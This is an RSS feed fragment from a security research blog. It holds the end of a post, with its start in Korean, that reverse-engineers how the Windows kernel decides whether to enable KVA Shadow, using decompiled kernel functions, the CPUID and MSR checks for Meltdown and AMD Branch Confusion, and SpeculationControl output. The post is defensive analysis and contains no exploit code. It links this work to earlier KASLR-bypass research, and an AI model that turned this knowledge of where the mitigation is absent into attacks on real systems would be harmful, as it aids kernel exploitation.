class="hljs-keyword">return</span> _RAX;    }  }  <span class="hljs-comment">// Others - disable KVAS</span>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( _RAX != <span class="hljs-number">3</span> || a1-&gt;CpuType == <span class="hljs-number">6</span> &amp;&amp; a1-&gt;CpuModel == <span class="hljs-number">13</span>)  {    <span class="hljs-keyword">return</span> _RAX;  }<span class="hljs-comment">// Check 3</span><span class="hljs-comment">// IA32_ARCH_CAPABILITIES support query</span>  _RAX = <span class="hljs-number">0</span>i64;  __asm { cpuid }  <span class="hljs-keyword">if</span> ( _RAX &lt; <span class="hljs-number">7</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;  _RAX = <span class="hljs-number">7</span>i64;  __asm { cpuid }  <span class="hljs-keyword">if</span> ( (_RDX &amp; <span class="hljs-number">0x20000000</span>) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;<span class="hljs-comment">// Check 3</span><span class="hljs-comment">// msr address 0x10A - IA32_ARCH_CAPABILITIES</span>  _RAX = __readmsr(<span class="hljs-number">0x10A</span>u);  <span class="hljs-comment">//IA32_ARCH_CAPABILITIES bit 0 : RDCL_NO</span>  <span class="hljs-keyword">if</span> ( (_RAX &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;   KiMicrocodeTrackerEnabled = <span class="hljs-number">1</span>;  LODWORD(_RAX) = <span class="hljs-number">3670016</span>;  LOBYTE(v13) = (KeFeatureBits2 &amp; <span class="hljs-number">0x28</span>) == <span class="hljs-number">8</span>;  <span class="hljs-keyword">if</span> ( (KeFeatureBits2 &amp; <span class="hljs-number">0x380000</span>) != <span class="hljs-number">3670016</span> )  {    LODWORD(_RAX) = KiIsFbClearSupported(KeFeatureBits2 &amp; <span class="hljs-number">0x380000</span>, v13);    LOBYTE(v13) = _RAX | v13;  }  <span class="hljs-keyword">if</span> ( v13 )  {ENABLE_KVAS:    <span class="hljs-keyword">if</span> ( a1-&gt;Number &amp;&amp; !KiKvaLeakage )      KeBugCheckEx(<span class="hljs-number">0x5D</span>u, <span class="hljs-number">0x4B56414C</span>ui64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);ENABLE_KVAS_BRANCH_CONFUSION:    v14 = *p_CpuVendor == <span class="hljs-number">2</span>;    **KiKvaLeakage = <span class="hljs-number">1</span>;**<span class="hljs-comment">//... for enable KVA</span>  }  <span class="hljs-keyword">return</span> _RAX;}</code></pre><p>The <code>KiDetectKvaLeakage</code> function determines whether KVAS is enabled based on CPU vendor and model information included in KPRCB and information that can be read from MSR. The verification routine can be divided into three main parts.</p><h3 id="Check-1"><a href="#Check-1" class="headerlink" title="Check 1"></a>Check 1</h3><ul><li>Check whether affected by Branch Confusion vulnerability through the <code>KiIsKvaShadowNeededForBranchConfusion</code> function</li><li>If the call result of the function is affected by Branch Confusion vulnerability, proceed to the <code>ENABLE_KVAS_BRANCH_CONFUSION</code> branch to activate KVAS</li></ul><h3 id="Check-2"><a href="#Check-2" class="headerlink" title="Check 2"></a>Check 2</h3><ul><li>Filter out older CPUs that are not affected by Meltdown and do not require KVAS activation using a bitmask, and disable KVAS.</li><li>Furthermore, since Meltdown is a vulnerability that only affects Intel processor architectures, disable KVAS for other vendors as well.</li></ul><h3 id="Check-3"><a href="#Check-3" class="headerlink" title="Check 3"></a>Check 3</h3><ul><li>First, check whether the CPU supports the MSR (Model Specific Register) function.<ul><li>If MSR is not supported, proceed to the <code>ENABLE_KVAS</code> branch to activate KVAS, as it is an older CPU affected by Meltdown.</li><li>Models that do not support MSR but are not affected are first filtered through a bitmask in the Check 2 routine.</li></ul></li><li>Read the MSR address <code>0x10A</code> using <code>__readmsr</code> - <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html">IA32_ARCH_CAPABILITIES</a><ul><li>If field 0 (<code>RDCL_NO</code>) of the result (<code>_RAX</code>) is not enabled, proceed to the <code>ENABLE_KVAS</code> branch to enable KVAS</li><li>RDCL_NO: A bit flag indicating immunity to Rogue Data Cache Load (Meltdown)</li></ul></li></ul><p>If KVAS is determined to be necessary through the above verification process, <code>KiKvaLeakage</code> is set to 1.</p><p>The main functions of this function can be summarized as identifying Intel processors affected by the Meltdown vulnerability in Check 2 and Check 3 and setting the KVAS activation flag. Check 1 will be explained in more detail below.</p><h2 id="KVAS-Activation-for-Branch-Confusion"><a href="#KVAS-Activation-for-Branch-Confusion" class="headerlink" title="KVAS Activation for Branch Confusion"></a>KVAS Activation for Branch Confusion</h2><p>KVAS is not a mitigation that only applies to Meltdown. You can confirm this with the function <code>KiIsKvaShadowNeededForBranchConfusion</code> called in the Check 1 routine.</p><pre><code class="hljs powershell">__int64 __fastcall KiIsKvaShadowNeededForBranchConfusion(__int64 a1){  unsigned int v2; // ebx  __int128 v4; // [<span class="hljs-type">rsp</span>+<span class="hljs-number">20</span><span class="hljs-type">h</span>] [<span class="hljs-type">rbp</span>-<span class="hljs-number">28</span><span class="hljs-type">h</span>] BYREF  __int64 v5; // [<span class="hljs-type">rsp</span>+<span class="hljs-number">30</span><span class="hljs-type">h</span>] [<span class="hljs-type">rbp</span>-<span class="hljs-number">18</span><span class="hljs-type">h</span>]  v5 = <span class="hljs-number">0</span>i64;  v4 = <span class="hljs-number">0</span>i64;  KiDetectHardwareSpecControlFeatures(a1, <span class="hljs-number">0</span>i64, (__int64)&amp;v4, <span class="hljs-number">0</span>i64);  <span class="hljs-keyword">if</span> ( (v4 &amp; <span class="hljs-number">0</span>x8000) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  v2 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( !(unsigned int)KiIsBranchConfusionMitigationDesired(a1, &amp;v4) )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  LOBYTE(v2) = (unsigned int)KiIsBranchConfusionMitigationSupported(a1, &amp;v4) != <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span> v2;}</code></pre><p>As the function name suggests, this function checks whether the CPU is affected by the Branch Confusion vulnerability and determines whether KVA Shadow activation is necessary.</p><ul><li>If the <code>0x8000</code> bit of <code>v4</code>, the result of calling the <code>KiDetectHardwareSpecControlFeatures</code> function, is 1, the CPU is affected by Branch Confusion.</li><li>If the relevant mitigation is supported, it returns True. - It enters the KVAS activation routine from the <code>KiDetectKvaLeakage</code> function.</li></ul><p>Let&#x2019;s take a closer look at the <code>KiDetectHardwareSpecControlFeatures</code> function.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *__fastcall <span class="hljs-title">KiDetectHardwareSpecControlFeatures</span><span class="hljs-params">(_KPRCB *PRCB, __int64 _zero, __int64 result2, <span class="hljs-keyword">char</span> *__zero)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> CpuModel_1; <span class="hljs-comment">// r14d</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">char</span> CpuType_Family; <span class="hljs-comment">// r12</span>  <span class="hljs-keyword">bool</span> IsAnyHypervisorPresent; <span class="hljs-comment">// r9</span>  <span class="hljs-keyword">char</span> CpuVendor_2; <span class="hljs-comment">// bl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ProcessorFlags; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuModel; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuStepping; <span class="hljs-comment">// al</span><span class="hljs-comment">//...</span>  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor_1; <span class="hljs-comment">// [rsp+20h] [rbp-60h]</span>      CpuVendor = PRCB-&gt;CpuVendor;  CpuType_Family = PRCB-&gt;CpuType_Family;  LOBYTE(CpuModel_1) = PRCB-&gt;CpuModel;<span class="hljs-comment">//...</span>  CpuVendor_1 = CpuVendor;  v48 = <span class="hljs-number">1</span>;    <span class="hljs-comment">// Hypervisor check</span>  <span class="hljs-keyword">if</span> ( HviIsHypervisorMicrosoftCompatible() )  {    HviGetEnlightenmentInformation(&amp;v54);    v53 = <span class="hljs-number">0</span>i64;    HviGetHypervisorFeatures(&amp;v53);    <span class="hljs-keyword">if</span> ( (v53 &amp; <span class="hljs-number">0x100000000000</span>i64) == <span class="hljs-number">0</span> || (v54 &amp; <span class="hljs-number">0x1000</span>) != <span class="hljs-number">0</span> )    {      IsAnyHypervisorPresent = <span class="hljs-number">1</span>;    }    <span class="hljs-keyword">else</span>    {      IsAnyHypervisorPresent = <span class="hljs-number">0</span>;      v48 = <span class="hljs-number">0</span>;    }  }  <span class="hljs-keyword">else</span>  {    IsAnyHypervisorPresent = HviIsAnyHypervisorPresent();    v48 = IsAnyHypervisorPresent;  }  v11 = result1;  <span class="hljs-keyword">if</span> ( KiIsBranchConfusionPresent(PRCB) )  {    v11 |= <span class="hljs-number">0x8000</span>ui64;    *&amp;result1 = v11;  }<span class="hljs-comment">//...</span>  *result2 = result1;  *(result2 + <span class="hljs-number">16</span>) = <span class="hljs-number">4</span>i64;  result = __zero;  <span class="hljs-keyword">if</span> ( __zero )    *__zero = v8;  <span class="hljs-keyword">return</span> result;}</code></pre><p>The function contains logic to check whether it is affected by various speculative execution-based side-channel vulnerabilities, but since the code is too long to write in its entirety, we will only look at the code that sets the <code>0x8000</code> bit to enable KVAS.</p><ul><li>For a list of speculative execution-related vulnerabilities, refer to <a href="https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11">MS Client Guidance</a></li></ul><p>If the return value of the <code>KiIsBranchConfusionPresent</code> function is True, the <code>0x8000</code> bit is set.</p><p><code>KiIsBranchConfusionPresent</code></p><pre><code class="hljs jsx">__int64 __fastcall KiIsBranchConfusionPresent(_KPRCB *a1){  bool IsAnyHypervisorPresent; <span class="hljs-comment">// al</span>  unsigned int v3; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">if</span> ( a1-&gt;CpuVendor != <span class="hljs-number">1</span> || (KeFeatureBits2 &amp; <span class="hljs-number">0x1000000</span>) != <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  IsAnyHypervisorPresent = HviIsAnyHypervisorPresent();  v3 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( IsAnyHypervisorPresent )    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>i64;  LOBYTE(v3) = a1-&gt;CpuType_Family != <span class="hljs-number">25</span>;  <span class="hljs-keyword">return</span> v3;}</code></pre><p>The function logic can be analyzed as follows.</p><ol><li>If CpuVendor is not AMD, return False.<ul><li>Branch Confusion is a vulnerability that affects only AMD CPUs (<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825">CVE-2022-23825</a>)</li></ul></li><li>If the Hypervisor is enabled, the <code>HviIsAnyHypervisorPresent</code> function returns True<ul><li>CVE-2022-23825 is a vulnerability that affects virtualized environments, so KVAS is implemented to activate only when the hypervisor is enabled.</li></ul></li><li>Returns True only if the Family Number is 25 for Zen 3 / Zen 3+ / Zen 4.<ul><li>It can be seen that other architectures are not affected.</li></ul></li></ol><p>After that, there is a final check before KVAS activation in <code>KiEnableKvaShadowing</code>.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiEnableKvaShadowing</span><span class="hljs-params">(_KPRCB *a1)</span></span><span class="hljs-function"></span>{  __int64 v2; <span class="hljs-comment">// rdx</span>  __int64 v3; <span class="hljs-comment">// rcx</span>  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// rax</span>  __int64 v6; <span class="hljs-comment">// rdx</span>  __int64 v7; <span class="hljs-comment">// r11</span>  <span class="hljs-keyword">unsigned</span> __int8 v8; <span class="hljs-comment">// cf</span>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int64 v10; <span class="hljs-comment">// rax</span>  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int16 v12; <span class="hljs-comment">// cx</span>  <span class="hljs-keyword">if</span> ( KiIsKvaShadowDisabled() )  {    KiIsKvaShadowConfigDisabled = <span class="hljs-number">1</span>;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">if</span> ( (KeFeatureBits2 &amp; <span class="hljs-number">0x18000</span>) == <span class="hljs-number">0x8000</span> )      *(_QWORD *)(v3 + <span class="hljs-number">11520</span>) = <span class="hljs-number">3</span>i64;    v4 = KiKernelCetEnabled;    <span class="hljs-keyword">if</span> ( !(_BYTE)KiKernelCetEnabled &amp;&amp; (<span class="hljs-keyword">unsigned</span> __int8)KiIsKvaLeakSimulated() )      KiKvaLeakageSimulate = <span class="hljs-number">1</span>;        <span class="hljs-comment">// Enable KVAS</span>    <span class="hljs-keyword">if</span> ( KiKvaLeakage || KiKvaLeakageSimulate )    {      <span class="hljs-keyword">if</span> ( v4 )        KeBugCheckEx(<span class="hljs-number">0x5D</span>u, <span class="hljs-number">0x4B766120</span>ui64, <span class="hljs-number">0x4B434554</span>ui64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);      v5 = __readcr3();      a1-&gt;KernelDirectoryTableBase = v5;      *(_QWORD *)(v2 + <span class="hljs-number">4216</span>) = *(_QWORD *)(v2 + <span class="hljs-number">4100</span>);      KiInitializeDescriptorIst(a1);      *(_QWORD *)(v7 + <span class="hljs-number">4100</span>) = v7 + <span class="hljs-number">16896</span>;      <span class="hljs-keyword">if</span> ( a1-&gt;Number )      {        result = KiShadowProcessorAllocation(a1, v7);        <span class="hljs-keyword">if</span> ( !(_DWORD)result )          <span class="hljs-keyword">return</span> result;        v12 = *(_WORD *)(KeGetPrcb(<span class="hljs-number">0</span>i64) + <span class="hljs-number">44714</span>);        a1-&gt;ShadowFlags |= <span class="hljs-number">2u</span>;        a1-&gt;VerwSelector = v12;      }      <span class="hljs-keyword">else</span>      {        LOBYTE(v6) = <span class="hljs-number">1</span>;        KiInitializeIdt(v7, v6);        KeGetCurrentThread()-&gt;ApcState.Process-&gt;AddressPolicy = <span class="hljs-number">1</span>;        byte_140FCE0E0 = <span class="hljs-number">1</span>;        _InterlockedOr(dword_140FCE57C, <span class="hljs-number">0x4000</span>u);        KiSetAddressPolicy(<span class="hljs-number">1</span>i64);        v8 = _bittest64((<span class="hljs-keyword">const</span> <span class="hljs-keyword">signed</span> __int64 *)&amp;a1-&gt;FeatureBits, <span class="hljs-number">0x2A</span>u);        a1-&gt;VerwSelector = <span class="hljs-number">24</span>;        <span class="hljs-keyword">if</span> ( v8 )        {          v9 = __readcr4();          __writecr4(v9 &amp; <span class="hljs-number">0xFFFFFFFFFFFDFF7F</span>ui64 | <span class="hljs-number">0x20000</span>);          v10 = __readcr3();          __writecr3(v10 | <span class="hljs-number">2</span>);          KiFlushPcid |= <span class="hljs-number">1u</span>;        }        <span class="hljs-keyword">if</span> ( (a1-&gt;FeatureBits &amp; <span class="hljs-number">0x240000000000</span>i64) == <span class="hljs-number">0x240000000000</span>i64 )          KiFlushPcid |= <span class="hljs-number">2u</span>;        HvlRescindEnlightenments();        KiKvaShadow = <span class="hljs-number">1</span>;        KiKvaShadowMode = <span class="hljs-number">2</span> - (KiFlushPcid != <span class="hljs-number">0</span>);      }      <span class="hljs-keyword">if</span> ( KiFlushPcid )        _interlockedbittestandset64((<span class="hljs-keyword">volatile</span> <span class="hljs-keyword">signed</span> __int32 *)&amp;a1-&gt;KernelDirectoryTableBase, <span class="hljs-number">0x3F</span>ui64);    }  }  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>i64;}</code></pre><ul><li><code>if ( KiKvaLeakage || KiKvaLeakageSimulate )</code> branch<ul><li>Global variable <code>KiKvaLeakage</code> set in the <code>KiDetectKvaLeakage</code> function</li><li>Global variable <code>KiKvaLeakageSimulate</code>, which is estimated to be determined by manual settings (for debugging and testing)</li></ul></li><li>If either of the two global variable values is set, KVAS is activated</li></ul><h1 id="Three-line-summary"><a href="#Three-line-summary" class="headerlink" title="Three-line summary"></a>Three-line summary</h1><ul><li>The Windows kernel dynamically activates KVAS (and other mitigations) at initialization depending on the CPU.</li><li>There are two main criteria for determining whether to activate KVAS<ul><li>Intel: Rogue Data Cache Load (Meltdown)</li><li>AMD: Branch Confusion</li></ul></li><li>The CPU checks whether hardware mitigations provided through MSR are applied, and if MSR functionality is not available, it determines whether to activate KVAS through legacy checks (bitmask, model number information, etc.).</li></ul><h1 id="Outro"><a href="#Outro" class="headerlink" title="Outro"></a>Outro</h1><p><img src="/2025/08/10/l0ch/deep-dive-into-kva/en/image1.jpg" alt="Untitled"><br>Actually, when side-channel vulnerabilities based on speculative execution were a hot topic, I was busy fulfilling my military service obligations and didn&#x2019;t have a chance to look into it properly. However, while writing this article and the previous one on KASLR bypass, I had the opportunity to examine it in detail. I realized once again that understanding past issues is just as important as keeping up with current trends.  <del>Now, I&#x2019;m going to try reading Windows Internals again&#x2026;</del></p><p>I&#x2019;ll bring you another interesting research topic next time~</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11">https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825</a></p><p><a href="https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html">https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html</a></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm</a></p><p><a href="https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04">https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04</a></p><p><a href="https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html">https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html</a></p><p><a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB">https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mitigation/">mitigation</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit-techniques/">exploit techniques</category>
      
      <category domain="https://hackyboiz.github.io/tags/KVAS/">KVAS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Deep Dive into KVA Shadow&#39;s Dynamic Activation Mechanism(Ko)</title>
      <link>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/ko/</link>
      <guid>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/ko/</guid>
      <pubDate>Sun, 10 Aug 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, L0ch&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;!  &amp;#xC9C0;&amp;#xB09C; &amp;#xBC88; &amp;#xAE00; &amp;#xC774;&amp;#xD6C4;&amp;#xB85C; &amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, L0ch&#xC785;&#xB2C8;&#xB2E4;!  &#xC9C0;&#xB09C; &#xBC88; &#xAE00; &#xC774;&#xD6C4;&#xB85C; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;</p><p>&#xC9C0;&#xB09C; &#xC8FC;&#xC81C;&#xB294; <a href="https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/">[Research] Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction</a> &#xC600;&#xC5C8;&#xB294;&#xB370;&#xC694;, KASLR &#xC6B0;&#xD68C; PoC&#xC758; &#xB3D9;&#xC791; &#xC870;&#xAC74; &#xC911; &#xD558;&#xB098;&#xAC00; KVA Shadow &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB2E4;! &#xB77C;&#xB294; &#xC774;&#xC57C;&#xAE30;&#xB97C; &#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC791;&#xC131; &#xB2F9;&#xC2DC;&#xC5D0;&#xB294; &#xCD5C;&#xC2E0; Windows 11&#xC5D0;&#xC11C;&#xB294; KVAS&#xAC00; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xACE0; &#xCD94;&#xCE21;&#xD588;&#xC5C8;&#xB294;&#xB370;, &#xD53C;&#xB4DC;&#xBC31;&#xC744; &#xD1B5;&#xD574; KVAS&#xB294; Windows &#xBC84;&#xC804; &#xAE30;&#xC900;&#xC774; &#xC544;&#xB2CC; CPU &#xBAA8;&#xB378;&#xACFC; &#xD2B9;&#xC815; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="SpeculationControl-PowerShell-script"><a href="#SpeculationControl-PowerShell-script" class="headerlink" title="SpeculationControl PowerShell script"></a><strong>SpeculationControl PowerShell script</strong></h1><p>KVAS&#xB294; Meltdown, Spectre&#xB85C; &#xB300;&#xD45C;&#xB418;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xCD94;&#xCE21; &#xC2E4;&#xD589; &#xAE30;&#xBC18; &#xC0AC;&#xC774;&#xB4DC;&#xCC44;&#xB110; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xBC00;&#xC811;&#xD55C; &#xAD00;&#xB828;&#xC774; &#xC788;&#xB294; &#xB9CC;&#xD07C;, &#xAD00;&#xB828; MS&#xC758; &#xC9C0;&#xC6D0; &#xC815;&#xBCF4;&#xB97C; &#xC27D;&#xAC8C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04">https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04</a></p><p>&#xC81C; &#xCEF4;&#xD4E8;&#xD130;&#xC778; 12&#xC138;&#xB300; Intel CPU&#xB85C; &#xD14C;&#xC2A4;&#xD2B8;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs powershell"><span class="hljs-comment"># Windwos 11 24H2 - Intel 12th i7-12700</span><span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> SpeculationControl                                                                                                                                                                                 &#xACC4;&#xC18D;&#xD558;&#xB824;&#xBA74; NuGet &#xACF5;&#xAE09;&#xC790;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.<span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-built_in">Get-SpeculationControlSettings</span>BTIHardwarePresent                  : TrueBTIWindowsSupportPresent            : TrueBTIWindowsSupportEnabled            : TrueBTIDisabledBySystemPolicy           : FalseBTIDisabledByNoHardwareSupport      : FalseBTIKernelRetpolineEnabled           : FalseBTIKernelImportOptimizationEnabled  : TrueRdclHardwareProtectedReported       : TrueRdclHardwareProtected               : TrueKVAShadowRequired                   : FalseKVAShadowWindowsSupportPresent      : TrueKVAShadowWindowsSupportEnabled      : FalseKVAShadowPcidEnabled                : FalseSSBDWindowsSupportPresent           : TrueSSBDHardwareVulnerable              : TrueSSBDHardwarePresent                 : TrueSSBDWindowsSupportEnabledSystemWide : FalseL1TFHardwareVulnerable              : FalseL1TFWindowsSupportPresent           : TrueL1TFWindowsSupportEnabled           : FalseL1TFInvalidPteBit                   : <span class="hljs-number">0</span>L1DFlushSupported                   : TrueHvL1tfStatusAvailable               : TrueHvL1tfProcessorNotAffected          : TrueMDSWindowsSupportPresent            : TrueMDSHardwareVulnerable               : FalseMDSWindowsSupportEnabled            : FalseFBClearWindowsSupportPresent        : TrueSBDRSSDPHardwareVulnerable          : FalseFBSDPHardwareVulnerable             : FalsePSDPHardwareVulnerable              : FalseFBClearWindowsSupportEnabled        : False</code></pre></p><div class="table-container"><table><thead><tr><th>Hardware requires kernel VA shadowing</th><th>Maps to KVAShadowRequired. This line tells you whether your system requires kernel VA shadowing to mitigate a vulnerability.</th></tr></thead><tbody><tr><td>Windows OS support for rogue data cache load mitigation is present</td><td>Maps to KVAShadowWindowsSupportPresent. This line tells you whether Windows operating system support for the kernel VA shadow feature is present.</td></tr><tr><td>Windows OS support for kernel VA shadow is present</td><td>Maps to KVAShadowWindowsSupportPresent. This line tells you whether Windows operating system support for the kernel VA shadow feature is present. If it is True, the January 2018 update is installed on the device, and kernel VA shadow is supported. If it is False, the January 2018 update is not installed, and kernel VA shadow support does not exist.</td></tr><tr><td>Windows OS support for rogue data cache load mitigation is enabled</td><td>Maps to KVAShadowWindowsSupportEnabled. This line tells you whether the kernel VA shadow feature is enabled. If it is True, the hardware is believed to be vulnerable to CVE-2017-5754, Windows operating system support is present, and the feature is enabled.</td></tr><tr><td>Windows OS support for kernel VA shadow is enabled</td><td>Maps to KVAShadowWindowsSupportEnabled. This line tells you whether the kernel VA shadow feature is enabled. If it is True, Windows operating system support is present, and the feature is enabled. The Kernel VA shadow feature is currently enabled by default on client versions of Windows and is disabled by default on versions of Windows Server. If it is False, either Windows operating system support is not present, or the feature is not enabled.</td></tr></tbody></table></div><pre><code class="hljs cpp">Windows&#xC5D0; KVA Shadow &#xAE30;&#xB2A5;&#xC740; &#xC874;&#xC7AC;&#xD558;&#xB098;(KVAShadowWindowsSupportPresent: True) &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C;(KVAShadowRequired: False) &#xD65C;&#xC131;&#xD654;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC740; &#xC0C1;&#xD0DC; (KVAShadowWindowsSupportEnabled: False)</code></pre><p>KVAS&#xAC00; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB41C; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB294; &#xB2E4;&#xC2DC; &#xB9D0;&#xD558;&#xBA74; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xAE30;&#xB2A5;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB9CC; <strong>&#xD558;&#xB4DC;&#xC6E8;&#xC5B4;(CPU)&#xAC00; &#xCDE8;&#xC57D;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xAE30;&#xB2A5;&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5C8;&#xB2E4;</strong>&#xACE0; &#xB9D0;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. </p><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; Windows&#xB294; &#xC5B4;&#xB514;&#xC11C;, &#xC5B4;&#xB5BB;&#xAC8C; 